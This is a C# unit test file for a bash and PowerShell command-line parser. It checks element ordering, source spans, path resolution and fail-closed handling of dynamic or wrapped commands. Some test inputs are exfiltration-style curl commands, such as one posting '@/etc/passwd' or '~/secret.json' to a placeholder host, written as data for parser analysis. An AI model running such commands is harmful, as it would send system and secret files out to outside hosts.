// -----------------------------------------------------------------------
// <copyright file="ClauseElementTests.cs" company="Aaron Stannard">
//      Copyright (C) 2026 - 2026 Aaron Stannard <https://github.com/Aaronontheweb>
// </copyright>
// -----------------------------------------------------------------------
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Xunit;

namespace ShellSyntaxTree.Tests.Parsing;

/// <summary>
/// Cross-shell contract tests for the issue #62 source-ordered clause element
/// projection.
/// </summary>
public class ClauseElementTests
{
    private static readonly BashParser Bash = new(new BashParserOptions
    {
        HomeDirectory = "/home/test",
        WorkingDirectory = "/work",
    });

    private static readonly PwshParser Pwsh = new(new PwshParserOptions
    {
        HomeDirectory = "C:/Users/user",
        WorkingDirectory = "C:/work",
    });

    [Fact]
    public void Git_option_position_is_preserved_in_both_parsers()
    {
        foreach (var (_, parser) in Parsers())
        {
            var global = Assert.Single(parser.Parse("git -C /repo commit").Clauses);
            Assert.Equal(
                new[] { "git", "-C", "/repo", "commit" },
                global.Elements.Select(element => element.Value).ToArray());
            Assert.Equal(
                new[]
                {
                    ClauseElementRole.Verb,
                    ClauseElementRole.Argument,
                    ClauseElementRole.Argument,
                    ClauseElementRole.Verb,
                },
                global.Elements.Select(element => element.Role).ToArray());
            Assert.Equal(
                new[] { 0, 1, 1, 1 },
                global.Elements.Select(element => element.PrecedingVerbElementCount).ToArray());

            var command = Assert.Single(parser.Parse("git commit -C HEAD~1").Clauses);
            Assert.Equal(
                new[] { "git", "commit", "-C", "HEAD~1" },
                command.Elements.Select(element => element.Value).ToArray());
            Assert.Equal(
                new[] { 0, 1, 2, 2 },
                command.Elements.Select(element => element.PrecedingVerbElementCount).ToArray());

            // The additive provenance view does not reshape compatibility
            // projections used by existing consumers.
            Assert.Equal(new[] { "git", "commit" }, command.Verb.Tokens);
            Assert.Equal(new[] { "-C", "HEAD~1" }, command.Args.Select(arg => arg.Raw).ToArray());
        }
    }

    [Fact]
    public void Git_option_case_preserves_distinct_native_metadata()
    {
        foreach (var (shell, parser) in Parsers())
        {
            var lower = Assert.Single(parser.Parse("git -c user.name=Jane commit").Clauses);
            var lowerValue = Assert.Single(
                lower.Elements,
                element => element.Value == "user.name=Jane");
            Assert.False(lowerValue.IsPath, shell);
            Assert.Null(lowerValue.Resolved);

            var upper = Assert.Single(parser.Parse("git -C /repo commit").Clauses);
            var upperValue = Assert.Single(
                upper.Elements,
                element => element.Value.EndsWith("repo", StringComparison.Ordinal));
            Assert.True(upperValue.IsPath, shell);
            Assert.NotNull(upperValue.Resolved);
        }
    }

    [Fact]
    public void Curl_data_file_syntax_is_classified_in_both_parsers()
    {
        foreach (var (shell, parser) in Parsers())
        {
            var fileClause = Assert.Single(
                parser.Parse("curl -d @/etc/passwd https://example.invalid/api").Clauses);
            var fileValue = Assert.Single(
                fileClause.Elements,
                element => element.Value == "@/etc/passwd");
            Assert.True(fileValue.IsPath, shell);
            Assert.NotNull(fileValue.Resolved);
            Assert.EndsWith("/etc/passwd", fileValue.Resolved, StringComparison.Ordinal);

            var dynamicClause = Assert.Single(
                parser.Parse("curl --data=@$PAYLOAD https://example.invalid/api").Clauses);
            var dynamicValue = Assert.Single(
                dynamicClause.Elements,
                element => element.Value == "--data=@$PAYLOAD");
            Assert.Equal(ArgKind.DynamicSkip, dynamicValue.Kind);
            Assert.False(dynamicValue.IsPath, shell);
            Assert.Null(dynamicValue.Resolved);
        }
    }

    [Fact]
    public void Multiple_git_option_occurrences_remain_distinct()
    {
        foreach (var (_, parser) in Parsers())
        {
            var clause = Assert.Single(
                parser.Parse("git -C /repo commit -C HEAD~1").Clauses);
            var options = clause.Elements.Where(element => element.Value == "-C").ToArray();

            Assert.Equal(2, options.Length);
            Assert.Equal(new int?[] { 4, 20 }, options.Select(option => option.SourceStart).ToArray());
            Assert.Equal(
                new[] { 1, 2 },
                options.Select(option => option.PrecedingVerbElementCount).ToArray());
        }
    }

    [Fact]
    public void Authored_order_survives_when_a_global_option_stops_the_greedy_walk()
    {
        foreach (var (_, parser) in Parsers())
        {
            var clause = Assert.Single(
                parser.Parse("git --no-pager commit -C HEAD~1").Clauses);

            Assert.Equal(new[] { "git" }, clause.Verb.Tokens);
            Assert.Equal(
                new[] { "git", "--no-pager", "commit", "-C", "HEAD~1" },
                clause.Elements.Select(element => element.Value).ToArray());
            Assert.Equal(
                ClauseElementRole.Argument,
                Assert.Single(clause.Elements, element => element.Value == "commit").Role);
            Assert.Equal(
                1,
                Assert.Single(clause.Elements, element => element.Value == "-C")
                    .PrecedingVerbElementCount);
        }
    }

    [Fact]
    public void Quoted_values_preserve_exact_raw_decoded_value_and_span()
    {
        const string source = "git -c \"user.name=Jane Doe\" commit";
        foreach (var (_, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse(source).Clauses);
            var element = Assert.Single(
                clause.Elements,
                candidate => candidate.Value == "user.name=Jane Doe");

            Assert.Equal("\"user.name=Jane Doe\"", element.Raw);
            Assert.Equal(source.IndexOf('"'), element.SourceStart);
            Assert.Equal(element.Raw.Length, element.SourceLength);
            Assert.Equal(1, element.PrecedingVerbElementCount);
        }
    }

    [Fact]
    public void Repeated_values_are_disambiguated_by_role_and_source_span()
    {
        foreach (var (_, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse("tool item --name item").Clauses);
            var repeated = clause.Elements.Where(element => element.Value == "item").ToArray();

            Assert.Equal(2, repeated.Length);
            Assert.Equal(ClauseElementRole.Verb, repeated[0].Role);
            Assert.Equal(ClauseElementRole.Argument, repeated[1].Role);
            Assert.Equal(5, repeated[0].SourceStart);
            Assert.Equal(17, repeated[1].SourceStart);
        }
    }

    [Fact]
    public void Verb_relative_position_resets_at_pipeline_boundaries()
    {
        const string source = "git -C /repo status | git commit -C HEAD~1";
        foreach (var (_, parser) in Parsers())
        {
            var clauses = parser.Parse(source).Clauses;
            Assert.Equal(2, clauses.Count);

            var firstFlag = Assert.Single(
                clauses[0].Elements,
                element => element.Value == "-C");
            var secondFlag = Assert.Single(
                clauses[1].Elements,
                element => element.Value == "-C");

            Assert.Equal(1, firstFlag.PrecedingVerbElementCount);
            Assert.Equal(2, secondFlag.PrecedingVerbElementCount);
            Assert.Equal(CompoundOperator.Pipe, clauses[1].Operator);
        }
    }

    [Fact]
    public void Redirect_is_one_element_at_its_authored_position()
    {
        const string source = "git -C /repo status > status.txt";
        foreach (var (shell, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse(source).Clauses);
            var redirect = Assert.Single(
                clause.Elements,
                element => element.Role == ClauseElementRole.Redirect);

            Assert.Equal("> status.txt", redirect.Raw);
            Assert.Equal("status.txt", redirect.Value);
            Assert.Equal(2, redirect.PrecedingVerbElementCount);
            Assert.Equal(source.IndexOf('>'), redirect.SourceStart);
            Assert.Equal(ClauseElementRole.Verb, clause.Elements[3].Role);
            Assert.True(redirect.IsPath, shell);
        }
    }

    [Fact]
    public void Inline_native_path_binding_remains_one_source_element()
    {
        foreach (var (shell, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse("git --work-tree=../repo status").Clauses);
            var option = Assert.Single(
                clause.Elements,
                element => element.Raw == "--work-tree=../repo");

            Assert.Equal("--work-tree=../repo", option.Value);
            Assert.Equal(ClauseElementRole.Argument, option.Role);
            Assert.True(option.IsFlag, shell);
            Assert.True(option.IsPath, shell);
            Assert.EndsWith("/repo", option.Resolved, StringComparison.Ordinal);
            Assert.DoesNotContain(
                clause.Elements,
                element => element.Raw is "--work-tree" or "../repo");
        }
    }

    [Fact]
    public void Adjacent_quoted_native_binding_is_one_path_aware_element()
    {
        const string source = "curl --data=\"@request file.json\" https://example.invalid/api";
        foreach (var (shell, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse(source).Clauses);
            var option = Assert.Single(
                clause.Elements,
                element => element.Raw == "--data=\"@request file.json\"");

            Assert.Equal("--data=@request file.json", option.Value);
            Assert.True(option.IsFlag, shell);
            Assert.True(option.IsPath, shell);
            Assert.EndsWith("/request file.json", option.Resolved, StringComparison.Ordinal);
            Assert.DoesNotContain(clause.Elements, element => element.Raw == "--data=");
        }
    }

    [Fact]
    public void Complete_adjacent_fragment_run_is_one_native_element()
    {
        const string source = "curl --data='@request'\" file.json\" https://example.invalid/api";
        foreach (var (shell, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse(source).Clauses);
            var option = Assert.Single(
                clause.Elements,
                element => element.Value == "--data=@request file.json");

            Assert.Equal("--data='@request'\" file.json\"", option.Raw);
            Assert.True(option.IsPath, shell);
            Assert.EndsWith("/request file.json", option.Resolved, StringComparison.Ordinal);
            Assert.DoesNotContain(
                clause.Elements,
                element => element.Raw is "'@request'" or "\" file.json\"");
        }
    }

    [Fact]
    public void Unquoted_value_prefix_joins_adjacent_native_fragments()
    {
        const string source = "curl --data=@request\".json\" https://example.invalid/api";
        foreach (var (shell, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse(source).Clauses);
            var option = Assert.Single(
                clause.Elements,
                element => element.Value == "--data=@request.json");

            Assert.Equal("--data=@request\".json\"", option.Raw);
            Assert.True(option.IsPath, shell);
            Assert.EndsWith("/request.json", option.Resolved, StringComparison.Ordinal);
        }
    }

    [Fact]
    public void Resolver_sensitive_mixed_quoting_safe_fails()
    {
        const string source = "curl --data='@$HOME'\".json\" https://example.invalid/api";
        foreach (var (shell, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse(source).Clauses);
            var option = Assert.Single(
                clause.Elements,
                element => element.Value == "--data=@$HOME.json");

            Assert.Equal(ArgKind.DynamicSkip, option.Kind);
            Assert.False(option.IsPath, shell);
            Assert.Null(option.Resolved);
        }

        const string transformedSource =
            "curl --data='@~'\"/secret.json\" https://example.invalid/api";
        foreach (var (shell, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse(transformedSource).Clauses);
            var option = Assert.Single(
                clause.Elements,
                element => element.Value == "--data=@~/secret.json");

            Assert.Equal(ArgKind.DynamicSkip, option.Kind);
            Assert.False(option.IsPath, shell);
            Assert.Null(option.Resolved);
        }
    }

    [Fact]
    public void Tar_helper_commands_safe_fail_and_native_paths_remain_arguments()
    {
        const string source = "tar -F ./helper.sh archive --file out.tar";
        foreach (var (shell, parser) in Parsers())
        {
            var clause = Assert.Single(parser.Parse(source).Clauses);
            Assert.Equal(new[] { "tar" }, clause.Verb.Tokens);

            var helper = Assert.Single(
                clause.Elements,
                element => element.Value == "./helper.sh");
            Assert.Equal(ArgKind.DynamicSkip, helper.Kind);
            Assert.False(helper.IsPath, shell);
            Assert.Null(helper.Resolved);

            var archive = Assert.Single(
                clause.Elements,
                element => element.Value == "archive");
            Assert.Equal(ClauseElementRole.Argument, archive.Role);
            Assert.True(archive.IsPath, shell);
        }
    }

    [Fact]
    public void PowerShell_inline_cmdlet_binding_carries_bound_value_metadata()
    {
        var clause = Assert.Single(Pwsh.Parse("Remove-Item -Path:C:\\repo").Clauses);
        var option = Assert.Single(
            clause.Elements,
            element => element.Role == ClauseElementRole.Argument);

        Assert.Equal("-Path:C:\\repo", option.Raw);
        Assert.Equal("-Path:C:\\repo", option.Value);
        Assert.True(option.IsFlag);
        Assert.True(option.IsPath);
        Assert.Equal("C:/repo", option.Resolved);
    }

    [Fact]
    public void PowerShell_inline_cmdlet_binding_decodes_backtick_escapes()
    {
        const string source = "Remove-Item -Path:C:\\payload` file.txt";
        var clause = Assert.Single(Pwsh.Parse(source).Clauses);
        var option = Assert.Single(
            clause.Elements,
            element => element.Role == ClauseElementRole.Argument);

        Assert.Equal("-Path:C:\\payload` file.txt", option.Raw);
        Assert.Equal("-Path:C:\\payload file.txt", option.Value);
        Assert.True(option.IsPath);
        Assert.Equal("C:/payload file.txt", option.Resolved);
    }

    [Fact]
    public void Synthetic_cwd_attribution_is_not_a_source_element()
    {
        var bashClauses = Bash.Parse("cd /repo && git status").Clauses;
        Assert.Contains(bashClauses[1].Args, arg => arg.IsCwdAttribution);
        Assert.Equal(
            new[] { "git", "status" },
            bashClauses[1].Elements.Select(element => element.Value).ToArray());

        var pwshClauses = Pwsh.Parse("Set-Location C:\\repo; git status").Clauses;
        Assert.Contains(pwshClauses[1].Args, arg => arg.IsCwdAttribution);
        Assert.Equal(
            new[] { "git", "status" },
            pwshClauses[1].Elements.Select(element => element.Value).ToArray());
    }

    [Fact]
    public void Wrapped_commands_keep_values_but_clear_outer_source_spans()
    {
        var bashClause = Assert.Single(Bash.Parse("bash -c \"git -C /repo status\"").Clauses);
        Assert.True(bashClause.IsCommandStringWrapped);
        Assert.Equal(
            new[] { "git", "-C", "/repo", "status" },
            bashClause.Elements.Select(element => element.Value).ToArray());
        Assert.All(bashClause.Elements, AssertSpanIsUnknown);

        var pwshClause = Assert.Single(Pwsh.Parse("pwsh -Command \"git -C C:\\repo status\"").Clauses);
        Assert.True(pwshClause.IsCommandStringWrapped);
        Assert.Equal(
            new[] { "git", "-C", "C:\\repo", "status" },
            pwshClause.Elements.Select(element => element.Value).ToArray());
        Assert.All(pwshClause.Elements, AssertSpanIsUnknown);
    }

    [Fact]
    public void Nested_bash_command_strings_keep_values_without_outer_source_spans()
    {
        var clause = Assert.Single(
            Bash.Parse("bash -c \"bash -c \\\"git status\\\"\"").Clauses);

        Assert.True(clause.IsCommandStringWrapped);
        Assert.Equal(
            new[] { "git", "status" },
            clause.Elements.Select(element => element.Value).ToArray());
        Assert.All(clause.Elements, AssertSpanIsUnknown);
    }

    [Fact]
    public void Dynamic_bash_command_string_stays_an_outer_source_aligned_clause()
    {
        const string source = "bash -c $code";
        var clause = Assert.Single(Bash.Parse(source).Clauses);

        Assert.False(clause.IsCommandStringWrapped);
        Assert.Equal(
            new[] { "bash", "-c", "$code" },
            clause.Elements.Select(element => element.Value).ToArray());
        Assert.All(clause.Elements, element => AssertSourceSlice(source, element));
    }

    [Fact]
    public void Static_invoke_expression_keeps_values_without_outer_source_spans()
    {
        var clause = Assert.Single(
            Pwsh.Parse("Invoke-Expression 'git -C C:\\repo status'").Clauses);

        Assert.True(clause.IsCommandStringWrapped);
        Assert.Equal(
            new[] { "git", "-C", "C:\\repo", "status" },
            clause.Elements.Select(element => element.Value).ToArray());
        Assert.All(clause.Elements, AssertSpanIsUnknown);
    }

    [Fact]
    public void Dynamic_invoke_expression_keeps_source_aligned_elements()
    {
        const string source = "Invoke-Expression $code";
        var clause = Assert.Single(Pwsh.Parse(source).Clauses);

        Assert.False(clause.IsCommandStringWrapped);
        Assert.Equal(
            new[] { "Invoke-Expression", "$code" },
            clause.Elements.Select(element => element.Value).ToArray());
        Assert.Equal(
            new[] { ClauseElementRole.Verb, ClauseElementRole.Argument },
            clause.Elements.Select(element => element.Role).ToArray());
        Assert.Equal(ArgKind.DynamicSkip, clause.Elements[1].Kind);
        Assert.All(clause.Elements, element => AssertSourceSlice(source, element));
    }

    [Fact]
    public void Inline_dynamic_invoke_expression_binding_is_one_authored_element()
    {
        const string source = "iex -Command:$code";
        var clause = Assert.Single(Pwsh.Parse(source).Clauses);

        Assert.Equal(new[] { "$code" }, clause.Args.Select(arg => arg.Raw).ToArray());
        Assert.Equal(
            new[] { "iex", "-Command:$code" },
            clause.Elements.Select(element => element.Value).ToArray());
        Assert.True(clause.Elements[1].IsFlag);
        Assert.Equal(ArgKind.DynamicSkip, clause.Elements[1].Kind);
        Assert.All(clause.Elements, element => AssertSourceSlice(source, element));
    }

    [Fact]
    public void Encoded_command_elements_have_no_invented_outer_spans()
    {
        var payload = Convert.ToBase64String(Encoding.Unicode.GetBytes("git commit -C HEAD~1"));
        var clause = Assert.Single(Pwsh.Parse($"pwsh -EncodedCommand {payload}").Clauses);

        Assert.Equal(
            new[] { "git", "commit", "-C", "HEAD~1" },
            clause.Elements.Select(element => element.Value).ToArray());
        Assert.All(clause.Elements, AssertSpanIsUnknown);
    }

    [Fact]
    public void PowerShell_command_wrapper_preserves_outer_redirect()
    {
        const string source = "pwsh -Command \"git status\" > outer.txt";
        var clause = Assert.Single(Pwsh.Parse(source).Clauses);
        var redirect = Assert.Single(clause.Redirects);
        var redirectElement = Assert.Single(
            clause.Elements,
            element => element.Role == ClauseElementRole.Redirect);

        Assert.Equal("C:/work/outer.txt", redirect.Target);
        Assert.Equal("> outer.txt", redirectElement.Raw);
        Assert.Equal("outer.txt", redirectElement.Value);
        Assert.Equal(source.IndexOf('>'), redirectElement.SourceStart);
        Assert.True(redirectElement.IsPath);
        Assert.Equal("C:/work/outer.txt", redirectElement.Resolved);
        Assert.All(
            clause.Elements.Where(element => element.Role != ClauseElementRole.Redirect),
            AssertSpanIsUnknown);

        var payload = Convert.ToBase64String(Encoding.Unicode.GetBytes("git status"));
        var encodedSource = $"pwsh -EncodedCommand {payload} > encoded.txt";
        var encodedClause = Assert.Single(Pwsh.Parse(encodedSource).Clauses);
        var encodedRedirect = Assert.Single(
            encodedClause.Elements,
            element => element.Role == ClauseElementRole.Redirect);
        Assert.Equal("> encoded.txt", encodedRedirect.Raw);
        Assert.Equal("C:/work/encoded.txt", encodedRedirect.Resolved);

        var emptyClause = Assert.Single(Pwsh.Parse("pwsh -Command \"\" > empty.txt").Clauses);
        Assert.Empty(emptyClause.Verb.Tokens);
        Assert.Equal("C:/work/empty.txt", Assert.Single(emptyClause.Redirects).Target);
        Assert.Equal(
            "> empty.txt",
            Assert.Single(emptyClause.Elements, element => element.Role == ClauseElementRole.Redirect).Raw);
    }

    private static IEnumerable<(string Shell, IShellParser Parser)> Parsers()
    {
        yield return ("bash", Bash);
        yield return ("pwsh", Pwsh);
    }

    private static void AssertSourceSlice(string source, ClauseElement element)
    {
        var start = Assert.IsType<int>(element.SourceStart);
        var length = Assert.IsType<int>(element.SourceLength);
        Assert.Equal(element.Raw, source.Substring(start, length));
    }

    private static void AssertSpanIsUnknown(ClauseElement element)
    {
        Assert.Null(element.SourceStart);
        Assert.Null(element.SourceLength);
    }
}
